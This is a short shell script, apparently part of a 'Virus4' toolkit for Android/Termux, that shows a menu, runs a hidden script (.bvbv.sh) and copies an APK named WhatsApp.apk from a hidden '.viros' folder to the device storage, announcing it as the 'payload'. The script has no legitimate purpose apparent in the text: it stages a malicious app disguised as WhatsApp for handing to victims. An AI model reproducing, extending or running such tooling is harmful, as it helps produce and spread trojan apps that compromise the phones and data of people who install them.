#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install

echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py
else
cd $HOME/Virus4
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/Virus4/.viros/WhatsApp.apk /sdcard/Virus4
echo -e "$green               end the vairos----->(WhatsApp) "
echo ""
echo "      Path of the pyload----->  sdcard/Virus4/WhatsApp.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
cd $HOME/Virus4
python2 Virus4.py
